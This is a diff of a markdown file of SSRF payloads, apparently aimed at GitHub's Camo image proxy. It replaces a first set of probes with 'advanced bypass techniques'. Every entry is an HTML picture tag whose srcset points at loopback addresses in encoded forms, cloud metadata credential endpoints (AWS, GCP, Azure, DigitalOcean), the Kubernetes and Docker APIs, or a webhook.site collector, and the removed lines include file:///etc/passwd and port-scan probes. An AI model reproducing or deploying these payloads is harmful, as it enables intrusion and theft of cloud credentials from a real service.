@@ -1,111 +1,156 @@
-# 🔬 SSRF Validation Tests
+# 🔬 SSRF Validation Tests v2
 
-Testing GitHub Camo proxy SSRF vulnerability.
+Advanced bypass techniques for GitHub Camo proxy.
 
-## Basic SSRF Confirmation
+## Round 2: Advanced Bypass Techniques
+
+### IPv4-mapped IPv6
 <picture>
-  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-1-basic">
-  <img src="https://via.placeholder.com/1x1.png" alt="Test 1">
+  <source srcset="http://[::ffff:127.0.0.1]/ssrf-ipv4mapped">
+  <img src="https://via.placeholder.com/1x1.png" alt="IPv4 Mapped">
 </picture>
 
-## Timing Attack Test (10s delay)
+### IPv6 Compressed Localhost
 <picture>
-  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-2-timing?delay=10">
-  <img src="https://via.placeholder.com/1x1.png" alt="Timing Test">
+  <source srcset="http://[0:0:0:0:0:0:0:1]/ssrf-ipv6-compressed">
+  <img src="https://via.placeholder.com/1x1.png" alt="IPv6 Compressed">
 </picture>
 
-## Data Exfiltration Test
+### Domain with localhost CNAME
 <picture>
-  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-3-data?data=github-internal-secret">
-  <img src="https://via.placeholder.com/1x1.png" alt="Data Test">
+  <source srcset="http://localtest.me/ssrf-localtest">
+  <img src="https://via.placeholder.com/1x1.png" alt="Localtest">
 </picture>
 
-## Header Analysis Test
+### Spoofed Host with @
 <picture>
-  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-4-headers">
-  <img src="https://via.placeholder.com/1x1.png" alt="Header Test">
+  <source srcset="http://example.com@127.0.0.1/ssrf-at-sign">
+  <img src="https://via.placeholder.com/1x1.png" alt="At Sign">
 </picture>
 
-## Redirect Following Test
+### URL with Credentials
 <picture>
-  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-5-redirect?step=1">
-  <img src="https://via.placeholder.com/1x1.png" alt="Redirect Test">
+  <source srcset="http://foo:bar@127.0.0.1/ssrf-creds">
+  <img src="https://via.placeholder.com/1x1.png" alt="Creds">
 </picture>
 
-## DNS Rebinding Test
+### Double URL Encoding
 <picture>
-  <source srcset="https://b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/ssrf-test-6-dns">
-  <img src="https://via.placeholder.com/1x1.png" alt="DNS Test">
+  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-double%252Fencoded">
+  <img src="https://via.placeholder.com/1x1.png" alt="Double Encoded">
 </picture>
 
-## IPv6 Localhost Test
+### Unicode Normalization
 <picture>
-  <source srcset="http://[::1]/ssrf-test-7-ipv6">
-  <img src="https://via.placeholder.com/1x1.png" alt="IPv6 Test">
+  <source srcset="http://127。1/ssrf-unicode">
+  <img src="https://via.placeholder.com/1x1.png" alt="Unicode">
 </picture>
 
-## AWS Metadata Test
+### Rare TLD (nip.io resolves to embedded IP)
 <picture>
-  <source srcset="http://169.254.169.254/latest/meta-data/">
-  <img src="https://via.placeholder.com/1x1.png" alt="AWS Metadata">
+  <source srcset="http://127.0.0.1.nip.io/ssrf-nip">
+  <img src="https://via.placeholder.com/1x1.png" alt="nip.io">
 </picture>
 
-## URL Encoding Bypass
+### sslip.io variant
 <picture>
-  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-8-encoded%3Fparam%3Dvalue">
-  <img src="https://via.placeholder.com/1x1.png" alt="Encoded Test">
+  <source srcset="http://127-0-0-1.sslip.io/ssrf-sslip">
+  <img src="https://via.placeholder.com/1x1.png" alt="sslip.io">
 </picture>
 
-## Alternative srcset Format
+### AWS IMDSv1 via IP
 <picture>
-  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-9-srcset 1x, https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/ssrf-test-9-srcset-2x 2x">
-  <img src="https://via.placeholder.com/1x1.png" alt="Srcset Format Test">
+  <source srcset="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+  <img src="https://via.placeholder.com/1x1.png" alt="AWS IMDS">
 </picture>
 
-## Protocol Handler Test - File
+### GCP Metadata
 <picture>
-  <source srcset="file:///etc/passwd">
-  <img src="https://via.placeholder.com/1x1.png" alt="File Protocol">
+  <source srcset="http://metadata.google.internal/computeMetadata/v1/">
+  <img src="https://via.placeholder.com/1x1.png" alt="GCP">
 </picture>
 
-## Protocol Handler Test - Gopher
+### Azure Metadata
 <picture>
-  <source srcset="gopher://webhook.site:80/_GET%20/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/gopher">
-  <img src="https://via.placeholder.com/1x1.png" alt="Gopher Protocol">
+  <source srcset="http://169.254.169.254/metadata/instance?api-version=2021-02-01">
+  <img src="https://via.placeholder.com/1x1.png" alt="Azure">
 </picture>
 
-## Internal Network Scan - Common Ports
+### DigitalOcean Metadata
 <picture>
-  <source srcset="http://127.0.0.1:22/ssrf-ssh">
-  <img src="https://via.placeholder.com/1x1.png" alt="SSH Scan">
+  <source srcset="http://169.254.169.254/metadata/v1/">
+  <img src="https://via.placeholder.com/1x1.png" alt="DO">
+</picture>
+
+### Kubernetes API
+<picture>
+  <source srcset="https://kubernetes.default.svc/api/v1/namespaces">
+  <img src="https://via.placeholder.com/1x1.png" alt="K8s">
+</picture>
+
+### Docker Socket via HTTP
+<picture>
+  <source srcset="http://127.0.0.1:2375/version">
+  <img src="https://via.placeholder.com/1x1.png" alt="Docker">
+</picture>
+
+### Consul
+<picture>
+  <source srcset="http://127.0.0.1:8500/v1/agent/self">
+  <img src="https://via.placeholder.com/1x1.png" alt="Consul">
+</picture>
+
+### Zero Prefix IP
+<picture>
+  <source srcset="http://0.0.0.0/ssrf-zero">
+  <img src="https://via.placeholder.com/1x1.png" alt="Zero IP">
+</picture>
+
+### Localhost Alias (some systems)
+<picture>
+  <source srcset="http://localhost/ssrf-localhost">
+  <img src="https://via.placeholder.com/1x1.png" alt="Localhost">
+</picture>
+
+### Short IP (some parsers expand)
+<picture>
+  <source srcset="http://127.1/ssrf-short">
+  <img src="https://via.placeholder.com/1x1.png" alt="Short IP">
+</picture>
+
+### Internal hostname guessing
+<picture>
+  <source srcset="http://github-internal/ssrf-internal">
+  <img src="https://via.placeholder.com/1x1.png" alt="Internal Host">
 </picture>
 
 <picture>
-  <source srcset="http://127.0.0.1:3306/ssrf-mysql">
-  <img src="https://via.placeholder.com/1x1.png" alt="MySQL Scan">
+  <source srcset="http://camo-internal/ssrf-camo">
+  <img src="https://via.placeholder.com/1x1.png" alt="Camo Internal">
 </picture>
 
+### Webhook with custom path params
 <picture>
-  <source srcset="http://127.0.0.1:6379/ssrf-redis">
-  <img src="https://via.placeholder.com/1x1.png" alt="Redis Scan">
+  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/round2/test1">
+  <img src="https://via.placeholder.com/1x1.png" alt="Webhook R2">
 </picture>
 
-## Decimal IP Encoding
+### Parser Confusion - Multiple @
 <picture>
-  <source srcset="http://2130706433/ssrf-decimal-localhost">
-  <img src="https://via.placeholder.com/1x1.png" alt="Decimal IP">
+  <source srcset="http://foo@evil.com@127.0.0.1/ssrf-multi-at">
+  <img src="https://via.placeholder.com/1x1.png" alt="Multi At">
 </picture>
 
-## Octal IP Encoding  
+### Fragment abuse
 <picture>
-  <source srcset="http://0177.0.0.1/ssrf-octal-localhost">
-  <img src="https://via.placeholder.com/1x1.png" alt="Octal IP">
+  <source srcset="http://127.0.0.1#@webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/fragment">
+  <img src="https://via.placeholder.com/1x1.png" alt="Fragment">
 </picture>
 
-## Hex IP Encoding
+### Tab/newline in URL
 <picture>
-  <source srcset="http://0x7f.0x0.0x0.0x1/ssrf-hex-localhost">
-  <img src="https://via.placeholder.com/1x1.png" alt="Hex IP">
+  <source srcset="http://127.0.0.1%09/ssrf-tab">
+  <img src="https://via.placeholder.com/1x1.png" alt="Tab">
 </picture>
 
 ---
